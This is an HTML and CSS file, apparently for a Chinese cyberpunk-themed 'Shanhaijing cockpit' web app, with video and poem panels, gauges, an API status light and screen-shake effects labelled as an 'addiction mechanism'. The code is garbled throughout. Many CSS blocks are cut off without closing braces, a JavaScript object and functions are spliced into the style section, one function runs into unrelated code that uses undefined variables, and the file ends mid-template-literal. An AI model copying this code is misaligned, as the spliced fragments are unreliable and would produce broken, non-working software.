<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>归墟 · 山海经拱门驾驶舱</title>
    <meta name="copyright" content="神思庭 (Shensist) shensist.top">
    <meta name="author" content="金威">
    <link rel="icon" href="./logo_ts.png" type="image/png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: black;
            color: white;
            font-family: 'Arial', 'Microsoft YaHei', sans-serif;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        /* ===== 驾驶舱容器 ===== */
        .cockpit {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        
        /* 山海经背景图轮播 */
        .bg-carousel {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        
        .bg-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            opacity: 0;
            transition: opacity 3s ease-in-out;
            filter: brightness(0.7) contrast(1.2) saturate(1.3);
        }
        
        .bg-image.active {
            opacity: 1;
            z-index: 2;
        }
        
        /* 赛博微光 */
        .cyber-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 30%, rgba(0, 255, 255, 0.15), transparent 70%);
            mix-blend-mode: overlay;
            z-index: 3;
            pointer-events: none;
            animation: glowPulse 8s infinite;
        }
        
        @keyframes glowPulse {
            0% { opacity: 0.3; }
            50% { opacity: 0.7; }
            100% { opacity: 0.3; }
        }
        
        /* 前挡风玻璃 */
        .windshield {
            position: absolute;
            top: 5%;
            left: 5%;
            width: 90%;
            height: 70%;
            background: rgba(10, 30, 50, 0.1);
            border: 3px solid rgba(0, 255, 255, 0.5);
            border-radius: 100px 100px 30px 30px;
            box-shadow: 
                0 0 80px rgba(0, 255, 255, 0.3),
                inset 0 0 100px rgba(0, 100, 200, 0.2);
            backdrop-filter: blur(5px);
            z-index: 10;
            overflow: hidden;
        }
        
        .grid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0,255,255,0.025) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,255,255,0.025) 1px, transparent 1px);
            background-size: 60px 60px;
            opacity: 0.6;   /* 调低一点，更通透 */
            z-index: 11;
        }
        
        /* 归墟箴言 */
        #mantra {
            position: absolute;
            top: 10%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: rgba(0, 255, 255, 0.7);
            font-size: 36px;
            white-space: nowrap;
            text-shadow: 0 0 50px rgba(0, 255, 255, 0.8);
            letter-spacing: 8px;
            z-index: 20;
            animation: mantraGlow 4s infinite;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px 40px;
            border-radius: 60px;
            border: 1px solid rgba(0, 255, 255, 0.3);
            backdrop-filter: blur(5px);
        }
        
        @keyframes mantraGlow {
            0% { opacity: 0.6; text-shadow: 0 0 30px rgba(0,255,255,0.6); }
            50% { opacity: 1; text-shadow: 0 0 80px rgba(0,255,255,1); }
            100% { opacity: 0.6; text-shadow: 0 0 30px rgba(0,255,255,0.6); }
        }
        
        /* ============================================================
           🌟 1. 左侧战术副屏：解除底部枷锁，让内部元素自由生长
           ============================================================ */
        #leftTacticalPanel {
            position: absolute !important;
            top: 90px !important;
            left: 25px !important;
            width: 250px !important; /* 锁定面板宽度 */
            /* ⚠️ 核心修复：删除了 bottom 限制，防止小屏幕下把两个框挤压重叠 */
            display: flex !important;
            flex-direction: column !important; /* 强制上下排队 */
            gap: 20px !important; /* 强制拉开 20 像素的绝对隔离带，死都不会重叠！ */
            z-index: 50 !important;
            pointer-events: none !important;
        }

        /* ============================================================
           🌟 2. 双子星屏幕同调：视频与诗文高度、宽度、比例【绝对一致】
           ============================================================ */
        #leftTacticalPanel #tacticalVideo,
        #leftTacticalPanel #poemCard {
            position: relative !important; /* ⚠️ 物理降维打击：剥夺飘浮能力，老实排队 */
            top: auto !important;
            left: auto !important;
            width: 100% !important;
            height: auto !important;
            aspect-ratio: 9 / 16 !important; /* ⚠️ 绝对同调：两者都被强制锁死为 9:16 竖屏大小！ */
            margin: 0 !important;
            flex-shrink: 0 !important; /* 无论屏幕多小，都绝对不准压缩变形！ */
            pointer-events: auto !important;
        }

        /* 视频专属特效 */
        #leftTacticalPanel #tacticalVideo {
            border-radius: 12px !important;
            border: 2px solid #0ff !important;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4) !important;
            object-fit: cover !important;
            display: block !important;
        }

        /* 诗文框专属特效 */
        #leftTacticalPanel #poemCard {
            background: rgba(0,0,0,0.8) !important;
            border: 1px solid rgba(0, 255, 255, 0.5) !important;
            padding: 15px !important;
            border-radius: 12px !important;
            font-size: 13px !important;
            line-height: 1.8 !important;
            color: #ccc !important;
            overflow-y: auto !important; /* 只有文字极多时才出滚动条 */
            scrollbar-width: none !important;
            transition: all 0.5s !important;
        }
        #leftTacticalPanel #poemCard::-webkit-scrollbar { display: none !important; }

        /* ============================================================
           🌟 3. 修复快捷键 1：全屏巨幕 (权重提升版)
           让选择器包含 #leftTacticalPanel，从而击败普通模式的锁定！
           ============================================================ */
        #leftTacticalPanel #tacticalVideo.movie-mode {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            max-height: none !important;
            
            /* 解除 9:16 锁定，允许横屏电影铺满 */
            aspect-ratio: auto !important; 
            
            border-radius: 0 !important;
            border: none !important;
            box-shadow: none !important;
            z-index: 9999 !important;
            
            /* 保持原比例，黑边填充 */
            object-fit: contain !important; 
            background-color: #000 !important;
        }

        /* ============================================================
           🌟 4. 修复快捷键 2：修神古卷轴 (内容显形终极版)
           使用 Flex 布局强制内容居中，并显式点亮内部文字
           ============================================================ */
        body.literary-mode #leftTacticalPanel #poemCard {
            position: fixed !important;
            top: 0 !important; left: 0 !important;
            width: 100vw !important; height: 100vh !important;
            transform: none !important; margin: 0 !important;
            
            /* 🌟 核心修复：改用 Flex 布局，让文字强制上下左右居中！ */
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            align-items: center !important;
            
            aspect-ratio: auto !important; /* 解除比例锁定 */
            background: radial-gradient(circle at center, rgba(10, 30, 45, 0.98) 0%, rgba(0, 5, 10, 1) 100%) !important;
            backdrop-filter: blur(20px) !important;
            border: none !important; border-radius: 0 !important;
            z-index: 9999 !important;
            overflow-y: auto !important; /* 内容太多时允许滚动 */
            pointer-events: auto !important;
        }

        /* 🌟 强制点亮内部的所有文字与内容 */
        body.literary-mode #leftTacticalPanel #poemCard .poem-title,
        body.literary-mode #leftTacticalPanel #poemCard #poemContent {
            display: block !important; /* 确保不被隐藏 */
            opacity: 1 !important;
            visibility: visible !important;
            color: #d4f3ff !important;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.3), 0 0 5px rgba(0, 255, 255, 0.8) !important;
            text-align: center !important;
            width: 80% !important; /* 防止文字太宽顶到屏幕边缘 */
        }

        /* 全屏模式下标题的专属样式 */
        body.literary-mode #leftTacticalPanel #poemCard .poem-title {
            font-family: 'STKaiti', 'KaiTi', '楷体', serif !important;
            font-size: 5vw !important; /* 超大标题 */
            margin-bottom: 60px !important;
            letter-spacing: 30px !important;
        }

        /* 全屏模式下正文的专属样式 */
        body.literary-mode #leftTacticalPanel #poemCard #poemContent {
            font-family: 'STKaiti', 'KaiTi', '楷体', serif !important;
            font-size: 3vw !important; /* 适合阅读的大字体 */
            line-height: 2.2 !important;
        }
        #musicHub {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 15, 30, 0.7);
            padding: 3px 3px 3px 15px;
            border-radius: 50px;
            border: 1px solid rgba(0, 255, 255, 0.3);
            backdrop-filter: blur(10px);
        }

        /* 🌟 中央主屏：纯粹的商战裁决视界 */
        #bombArea {
            position: absolute;
            top: 25%; /* 放在正中央黄金视觉位 */
            left: 50%;
            transform: translateX(-50%);
            width: 70%;
            max-width: 1000px;
            z-index: 25;
            pointer-events: none;
        }

        #dagyaoText {
            color: #f00;
            font-size: 28px; /* 字体非常大 */
            text-shadow: 0 0 30px #f00;
            background: rgba(20, 0, 0, 0.85); /* 更深的血色背景 */
            padding: 30px 40px;
            border-radius: 20px;
            backdrop-filter: blur(15px);
            border: 2px solid #f00;
            line-height: 1.6;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5), inset 0 0 20px rgba(255, 0, 0, 0.3);
        }

        /* 🌟 上瘾机制：暴击震动特效 */
        .shake-hard {
            animation: shakeScreen 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
        .shake-extreme {
            animation: shakeScreenExtreme 0.8s cubic-bezier(.36,.07,.19,.97) both;
        }
        .shake-light {
            animation: shakeScreenLight 0.3s cubic-bezier(.36,.07,.19,.97) both;
        }
        @keyframes shakeScreen {
            10%, 90% { transform: translate3d(-5px, 0, 0); }
            20%, 80% { transform: translate3d(5px, 5px, 0); }
            30%, 50%, 70% { transform: translate3d(-10px, -5px, 0); }
            40%, 60% { transform: translate3d(10px, 5px, 0); }
        }
        @keyframes shakeScreenExtreme {
            0%, 100% { transform: translate3d(0, 0, 0); }
            10% { transform: translate3d(-15px, 0, 0) rotate(-2deg); }
            20% { transform: translate3d(15px, 10px, 0) rotate(2deg); }
            30% { transform: translate3d(-20px, -10px, 0) rotate(-3deg); }
            40% { transform: translate3d(20px, 10px, 0) rotate(3deg); }
            50% { transform: translate3d(-25px, -15px, 0) rotate(-4deg); }
            60% { transform: translate3d(25px, 15px, 0) rotate(4deg); }
            70% { transform: translate3d(-15px, -10px, 0) rotate(-2deg); }
            80% { transform: translate3d(15px, 5px, 0) rotate(2deg); }
            90% { transform: translate3d(-5px, 0, 0) rotate(-1deg); }
        }
        @keyframes shakeScreenLight {
            10%, 90% { transform: translate3d(-2px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 1px, 0); }
            30%, 50%, 70% { transform: translate3d(-3px, -1px, 0); }
            40%, 60% { transform: translate3d(3px, 1px, 0); }
        }
        
        /* 🌟 字符特效动画 */
        @keyframes charBurst {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.5); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes charFade {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        @keyframes charFlicker {
            0%, 100% { opacity: 1; }
            25% { opacity: 0.3; }
            50% { opacity: 1; }
            75% { opacity: 0.5; }
        }
        @keyframes completionPulse {
            0% { transform: scale(0); opacity: 0; }
            50% { transform: scale(1.5); opacity: 1; }
            100% { transform: scale(1); opacity: 0.8; }
        }
        @keyframes godPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        /* 拱形仪表盘 */
        .arch-dashboard {
            position: absolute;
            bottom: 12%; 
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 1400px;
            height: 280px; /* 从 200px 增高到 280px，拉出巨大的拱门空间 */
            z-index: 30;
            pointer-events: none;
        }
        
        /* 2. 虚线 SVG 层 */
        .arch-svg {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 30px rgba(0, 255, 255, 0.5));
        }
        
        .arch-path {
            fill: none;
            stroke: #0ff;
            stroke-width: 4;
            stroke-linecap: round;
            stroke-dasharray: 10 10;
            animation: dashMove 30s linear infinite;
        }
        
        @keyframes dashMove {
            to { stroke-dashoffset: -100; }
        }
        
        /* 3. 修改仪表盘的对齐方式，从底部对齐改为顶部对齐 */
        .gauge-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: space-around;
            align-items: flex-start; /* 关键修改：顶部对齐 */
            padding: 0 2%;
            z-index: 31;
            pointer-events: auto;
        }
        
        /* ===== 全息圆角仪表盘（赛博气泡流线型） ===== */
        .gauge {
            text-align: center;
            color: #0ff;
            text-shadow: 0 0 15px #0ff;
            font-size: 18px;
            letter-spacing: 3px;
            width: 22%;
            /* 柔和的深邃玻璃渐变，与大屏外框质感无缝统一 */
            background: linear-gradient(135deg, rgba(0, 25, 45, 0.65) 0%, rgba(0, 5, 15, 0.9) 100%);
            backdrop-filter: blur(15px);
            /* 核心调整：大圆角设计，极致平滑的赛博感 */
            border-radius: 25px; 
            /* 一体成型的霓虹微光边框 */
            border: 1px solid rgba(0, 255, 255, 0.25);
            box-shadow: 
                0 10px 25px rgba(0, 0, 0, 0.6), 
                0 0 20px rgba(0, 255, 255, 0.15),
                inset 0 0 15px rgba(0, 255, 255, 0.1);
            padding: 15px 5px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            overflow: hidden; /* 让内部的流光扫描不出界 */
        }

        /* 动态科技感：赛博流光扫面效果 */
        .gauge::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 50%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.3), transparent);
            transform: skewX(-25deg);
            animation: cyberSweep 4s infinite;
            pointer-events: none;
        }

        /* 控制流光扫过的频率和停顿 */
        @keyframes cyberSweep {
            0% { left: -100%; }
            15% { left: 200%; }
            100% { left: 200%; }
        }

        /* 悬停/数值飙升时的紫红色狂暴反馈 */
        .gauge:hover {
            transform: translateY(-8px) scale(1.03);
            border-color: #f0f;
            box-shadow: 
                0 15px 35px rgba(0, 0, 0, 0.8),
                0 0 35px rgba(255, 0, 255, 0.4), 
                inset 0 0 25px rgba(255, 0, 255, 0.25);
        }

        /* 4. 核心！让四个仪表盘呈现拱形错落排列，完美避开输入框 */
        .gauge:nth-child(1), .gauge:nth-child(4) {
            margin-top: 120px; /* 两侧的【命盘】和【当前神】下降，贴合圆弧底部 */
        }
        .gauge:nth-child(2), .gauge:nth-child(3) {
            margin-top: 10px;  /* 中间的【杀意】和【撕裂】抬高，骑在圆弧顶端 */
        }
        
        .gauge-label {
            font-size: 18px;
            margin-bottom: 10px;
            color: rgba(0, 255, 255, 0.9);
            text-transform: uppercase;
            letter-spacing: 4px;
        }
        
        .gauge-value {
            font-size: 48px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 30px #0ff;
            font-family: 'Courier New', monospace;
        }
        
        #currentGodValue {
            color: #f0f;
            text-shadow: 0 0 30px #f0f;
        }
        
        /* 撕裂值数字跳动效果 */
        #sile {
            animation: jump 0.4s;
        }
        @keyframes jump {
            0% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        /* 人类驾驶员 */
        .pilot-area {
            position: absolute;
            bottom: 2%;
            left: 50%;
            transform: translateX(-50%);
            width: 160px;
            height: 160px;
            z-index: 35;
            pointer-events: none;
        }
        
        .pilot {
            position: relative;
            width: 100%;
            height: 100%;
        }
        
        .pilot-female { display: block; }
        .pilot-male { display: none; }
        .pilot.female .pilot-female { display: block; }
        .pilot.female .pilot-male { display: none; }
        .pilot.male .pilot-female { display: none; }
        .pilot.male .pilot-male { display: block; }
        
        .female-body {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 80px;
            background: linear-gradient(135deg, #aaddff, #77aaff);
            border-radius: 30px 30px 10px 10px;
            box-shadow: 0 0 40px rgba(100, 200, 255, 0.8);
            border: 2px solid #0ff;
            z-index: 2;
        }
        
        .female-head {
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #ffddbb, #ffccaa);
            border-radius: 50%;
            border: 2px solid #0ff;
            box-shadow: 0 0 30px rgba(255, 200, 150, 0.8);
            z-index: 3;
        }
        
        .female-head::before {
            content: '♀';
            position: absolute;
            top: 5px;
            right: -15px;
            color: #f0f;
            font-size: 20px;
            font-weight: bold;
            text-shadow: 0 0 20px #f0f;
        }
        
        .male-body {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            width: 70px;
            height: 90px;
            background: linear-gradient(135deg, #88aaff, #5577dd);
            border-radius: 35px 35px 10px 10px;
            box-shadow: 0 0 40px rgba(50, 150, 255, 0.8);
            border: 2px solid #0ff;
            z-index: 2;
        }
        
        .male-head {
            position: absolute;
            top: -30px;
            left: 50%;
            transform: translateX(-50%);
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #ffccaa, #ffbb99);
            border-radius: 50%;
            border: 2px solid #0ff;
            box-shadow: 0 0 30px rgba(255, 180, 130, 0.8);
            z-index: 3;
        }
        
        .male-head::before {
            content: '♂';
            position: absolute;
            top: 5px;
            right: -15px;
            color: #0ff;
            font-size: 20px;
            font-weight: bold;
            text-shadow: 0 0 20px #0ff;
        }
        
        .chair-back {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 90px;
            height: 100px;
            background: rgba(0, 255, 255, 0.1);
            border: 2px solid rgba(0, 255, 255, 0.3);
            border-radius: 20px;
            backdrop-filter: blur(5px);
            z-index: 1;
        }
        
        /* 性别切换 */
        .gender-switch {
            position: absolute;
            bottom: 12%;
            left: 20px;
            width: 45px;
            height: 45px;
            border-radius: 50%;
            background: rgba(0, 255, 255, 0.2);
            border: 2px solid #0ff;
            color: white;
            font-size: 22px;
            cursor: pointer;
            z-index: 50;
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s;
        }
        
        .gender-switch:hover {
            background: rgba(0, 255, 255, 0.6);
            box-shadow: 0 0 30px #0ff;
        }
        
        /* 🌟 2. 巨型输入中枢：让驾驶员畅所欲言！ */
        #inputArea {
            position: absolute;
            bottom: 35px;
            left: 50%;
            transform: translateX(-50%);
            width: 75%; /* 加宽！跨度更大 */
            max-width: 1200px; 
            display: flex;
            gap: 20px;
            z-index: 45;
            pointer-events: auto;
            align-items: center;
        }

        /* 🌟 4. 百字长文输入框样式：匹配多行高度 */
        #textInput {
            flex: 1;
            background: linear-gradient(135deg, rgba(0, 25, 45, 0.85) 0%, rgba(0, 5, 15, 0.95) 100%);

        /* ===== 全息能量发送按钮 ===== */

        .hint-tooltip {
            position: absolute;
            top: 60px;
            right: 0;
            width: 260px;
            background: linear-gradient(135deg, rgba(0, 10, 25, 0.95), rgba(20, 0, 20, 0.95));
            border: 1px solid #f0f;
            padding: 15px 20px;
            border-radius: 12px;
            color: #0ff;

            /* 动画初始状态：透明且向上偏移 */
            opacity: 0;
            visibility: hidden;
            transform: translateY(-15px);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);

            pointer-events: none; /* 防止遮挡下方点击 */

        .hint-tooltip::before {
            content: '';

            height: 12px;
            background: rgba(0, 10, 25, 0.95);

            border-left: 1px solid #f0f;

        /* 多模型配置面板 */

        /* ==========================================
           🌟 API 神经链路物理指示灯
           ========================================== */
        #apiSubmitBtn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px; /* 让灯和文字保持距离 */
        }

        #apiStatusLight {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #555; /* 默认未激活的熄灭状态 */
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
            transition: all 0.3s ease;
        }

        /* 正在连接：高频闪烁青光 */
        .status-loading {
            background-color: #0ff !important;
            box-shadow: 0 0 15px #0ff, inset 0 0 5px #fff !important;
            animation: pulseCyan 0.4s infinite alternate;
        }

        /* 连接成功：常亮幽绿光 */
        .status-green {
            background-color: #0f0 !important;
            box-shadow: 0 0 15px #0f0, inset 0 0 5px #fff !important;
        }

        /* 连接断裂/报错：狂暴红光警报 */
        .status-red {
            background-color: #f00 !important;
            box-shadow: 0 0 20px #f00, inset 0 0 5px #fff !important;
            animation: pulseRed 0.3s infinite alternate;
        }

        @keyframes pulseCyan { from { opacity: 0.4; } to { opacity: 1; } }
        @keyframes pulseRed { from { opacity: 0.5; } to { opacity: 1; transform: scale(1.1); } }

        /* ===== 第一人称座舱物理锚点 ===== */
        .cockpit-anchor {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            height: 200px;
            z-index: 40; /* 低于输入框(45)，高于大屏背景(30) */
            pointer-events: none; /* 绝对不阻挡任何鼠标点击 */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end;
        }

        /* 全息驾驶员背影（半透明、不突兀、充满科技感） */
        .holo-pilot {
            position: relative;
            width: 130px;
            height: 150px;
            margin-bottom: -50px; /* 下沉到操作台内部，形成纵深立体感 */
            opacity: 0.85;
            filter: drop-shadow(0 0 20px rgba(0, 255, 255, 0.4));
            /* 模拟人在驾驶时的微弱呼吸起伏 */
            animation: pilotBreathe 4s infinite alternate ease-in-out;
        }

        @keyframes pilotBreathe {
            0% { transform: translateY(0); opacity: 0.7; }
            100% { transform: translateY(-5px); opacity: 0.95; }
        }

        .holo-head {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 48px;
            height: 55px;
            /* 幽蓝色的全息头部 */
            background: radial-gradient(ellipse at 50% 30%, rgba(0, 255, 255, 0.8), rgba(0, 30, 60, 0.9));
            border: 2px solid rgba(0, 255, 255, 0.6);
            border-radius: 40% 40% 50% 50%;
            box-shadow: inset 0 0 15px #0ff, 0 0 20px rgba(0, 255, 255, 0.5);
        }

        /* 驾驶员后颈部的神经元接入光带 */
        .holo-head::after {
            content: '';
            position: absolute;
            bottom: -6px;
            left: 50%;
            transform: translateX(-50%);
            width: 12px;
            height: 4px;
            background: #f0f;
            border-radius: 10px;
            box-shadow: 0 0 10px #f0f;
        }

        .holo-body {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 110px;
            height: 90px;
            background: linear-gradient(to bottom, rgba(0, 150, 255, 0.25), rgba(0, 10, 20, 0.95));
            border-top: 2px solid rgba(0, 255, 255, 0.5);
            border-radius: 45px 45px 0 0;
            box-shadow: inset 0 15px 20px rgba(0, 255, 255, 0.15);
        }

        /* 实体弧形主控台 (完美托起您的输入框) */
        .control-desk {
            width: 100%;
            height: 80px;
            background: linear-gradient(to bottom, rgba(0, 25, 40, 0.95), #000);
            border-top: 2px solid #0ff;
            /* 打造出一种环绕驾驶员的巨大弧面感 */
            border-radius: 50% 50% 0 0 / 25px 25px 0 0;
            box-shadow: 
                0 -10px 40px rgba(0, 255, 255, 0.15), 
                inset 0 10px 20px rgba(0, 255, 255, 0.2);
            position: relative;
        }

        /* 控制台边缘的扫描高光 */
        .control-desk::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 30%;
            height: 3px;
            background: #fff;
            box-shadow: 0 0 15px #fff, 0 0 30px #0ff;
            border-radius: 50%;

        .copyright a {

            letter-spacing: 2px;

    /* 视频轰炸专属：全息投影质感 */
        .holo-video {
            width: 80%;
            max-width: 400px; /* 控制视频不要太大，免得挡住UI */
            height: auto;
            border-radius: 12px;
            border: 2px solid rgba(0, 255, 255, 0.4);
            box-shadow: 
                0 0 25px rgba(0, 255, 255, 0.2),
                inset 0 0 15px rgba(0, 255, 255, 0.3);
            opacity: 0.9;
            mix-blend-mode: screen; /* 与黑底融为一体，赛博感极强 */
            transition: all 0.3s ease;
        }
        
        .holo-video:hover {
            border-color: #f0f;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
            opacity: 1;
            mix-blend-mode: normal;
        }

    /* ===== 全屏沉浸式电影巨幕 ===== */
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; /* 保证视频填满整个屏幕且不变形 */
            z-index: 2; /* 盖住静态背景图，但在玻璃和微光之下 */
            opacity: 0; /* 默认隐藏 */
            transition: opacity 1.5s ease-in-out; /* 电影级的淡入淡出 */
            pointer-events: none; /* 绝对不阻挡鼠标点击 */
            filter: brightness(0.6) contrast(1.2) saturate(1.2); /* 压暗亮度，突出前方UI和大妖红字 */
        }
        
        .fullscreen-video.active {
            opacity: 1;
        }

    /* ===== 互动电影全屏巨幕（强制破除 180px 封印版） ===== */
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            
            /* 打破全局 video 标签的紧箍咒！ */
            max-height: none !important; 
            max-width: none !important;
            border: none !important;       /* 剥夺青色边框 */
            box-shadow: none !important;   /* 剥夺红色发光 */
            border-radius: 0 !important;   /* 恢复直角铺满屏幕 */
            
            object-fit: cover;
            z-index: 2;
            opacity: 0;
            transition: opacity 1.5s ease-in-out; 
            pointer-events: none;
            filter: brightness(0.6) contrast(1.2) saturate(1.2);
        }
        
        .fullscreen-video.active {
            opacity: 1;
        }

    /* ===== 视频：战术小窗 vs 电影巨幕 ===== */
        #media-video {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 320px;           /* 默认战术小窗大小 */
            border-radius: 15px;
            border: 2px solid #0ff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
            z-index: 50;            /* 默认在 UI 层 */
            transition: all 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
            opacity: 0;             /* 默认隐藏，触发时显示 */
        }

        /* 按下快捷键 1：化身电影巨幕 */
        #media-video.movie-mode {
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border-radius: 0;
            border: none;
            box-shadow: none;
            z-index: 5;             /* 退到玻璃和UI的底层 */
            object-fit: cover;
            filter: brightness(0.6);
        }

        
        
        /* 按下全屏模式时，隐藏其他无关 UI 增强沉浸感 */
        body.movie-mode .arch-dashboard, 
        body.movie-mode #inputArea,
        body.literary-mode .arch-dashboard,
        body.literary-mode #inputArea {
            opacity: 0;
            pointer-events: none;
        }

    /* 强制拉开战歌与诗文的间距 */
        #contentBomb { 
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 25px; /* 绝对隔离：上下拉开25像素 */
            margin-top: 20px;
        }

        /* ===== 战术小窗（移至左侧，完美避开右上角的API控制台） ===== */
        #tacticalVideo {
            position: absolute;
            top: 90px;      
            left: 25px;     
            width: 320px;
            border-radius: 12px;
            border: 2px solid #0ff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
            z-index: 50; 
            transition: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
            opacity: 0; 
            pointer-events: none;
        }

        /* 🌟 按下 1：化身绝对的纯净全屏巨幕（原比例保护版） */
        #tacticalVideo.movie-mode {
            top: 0;
            left: 0;        
            width: 100vw;
            height: 100vh;
            max-height: none !important;
            border-radius: 0;
            border: none;
            box-shadow: none;
            z-index: 9999 !important; 
            
            /* 🌟 核心抢救：从 cover 改为 contain，誓死保卫 9:16 和 16:9 原生比例！ */
            object-fit: contain; 
            
            /* 🌟 影院级黑场：多余的空间自动用深邃纯黑填充，不暴露底层 UI */
            background-color: #000; 
            
            filter: brightness(1) !important; 
            pointer-events: auto;
        }
        
        /* 🌟 沉浸式隐身咒：强制抹除所有杂念 UI */

                video: "./再战大妖2.mp4",

                poem: "弱水三千，你连一滴都护不住！"

            "混沌": {
                video: "./再战大妖3.mp4",
                music: "./高管甩锅/高管甩锅_音乐_月黑风高.mp3",
                poem: "因果坍塌，万法归宗，你我皆在局中。"
            }

        // ==================== 全局静音控制 ====================
        let isMuted = false;
        function toggleMute() {
            isMuted = !isMuted;
            const btn = document.getElementById('muteBtn');
            btn.innerText = isMuted ? "🔇" : "�";
            btn.classList.toggle('muted', isMuted);
            
            // 实时控制正在播放的音乐
            if (currentAudio) {
                currentAudio.muted = isMuted;
            }
        }
        
        // ==================== 触控阵列核心逻辑 (解救手机端) ====================
        
        // 对应原快捷键 1：巨幕模式
        function toggleMovieMode() {
            const videoEl = document.getElementById('tacticalVideo');
            if (!videoEl) return;
            
            if (document.body.classList.contains("movie-mode")) {
                // 退出巨幕
                document.body.classList.remove("movie-mode");
                videoEl.classList.remove("movie-mode");
                videoEl.muted = true;
                if (currentAudio && !isMuted) currentAudio.play().catch(e=>console.log(e));
            } else {
                // 进入巨幕 (同时强制关闭修神模式，防止冲突)
                document.body.classList.add("movie-mode");
                document.body.classList.remove("literary-mode");
                videoEl.classList.add("movie-mode");
                if (currentAudio) currentAudio.pause();
                videoEl.muted = false;
                videoEl.play().catch(e=>console.log(e));
            }

            document.getElementById('stopApiBtn').style.display = 'none'; // 隐藏刹车

            // 🌟 上瘾机制：动态震动系统
            const mpChange = decision.mingpan_change || -10;
            let shakeIntensity = 'normal';
            let shakeDuration = 500;
            
            if (mpChange <= -25) {
                shakeIntensity = 'extreme';
                shakeDuration = 800;
                document.body.classList.add('shake-extreme');
                setTimeout(() => document.body.classList.remove('shake-extreme'), shakeDuration);
            } else if (mpChange <= -15) {
                shakeIntensity = 'hard';
                shakeDuration = 600;
                document.body.classList.add('shake-hard');
                setTimeout(() => document.body.classList.remove('shake-hard'), shakeDuration);
            } else if (mpChange <= -5) {
                shakeIntensity = 'light';
                shakeDuration = 300;
                document.body.classList.add('shake-light');
                setTimeout(() => document.body.classList.remove('shake-light'), shakeDuration);
            }

            // 更新仪表盘数值
            mingpan = Math.max(0, Math.min(100, mingpan + mpChange));
            shayi = Math.max(0, Math.min(100, shayi + (decision.shayi_change || 15)));
            sile += (decision.sile_change || 2000);
            updateDashboard();

            const dText = document.getElementById('dagyaoText');
            dText.style.opacity = 1;
            
            // 🌟 上瘾机制：增强打字机审判特效
            const godColor = shakeIntensity === 'extreme' ? '#ff0066' : 
                           shakeIntensity === 'hard' ? '#ff3333' : '#ff6666';
            const textColor = shakeIntensity === 'extreme' ? '#fff' : '#0ff';
            const fontSize = shakeIntensity === 'extreme' ? '32px' : '26px';
            
            dText.innerHTML = `
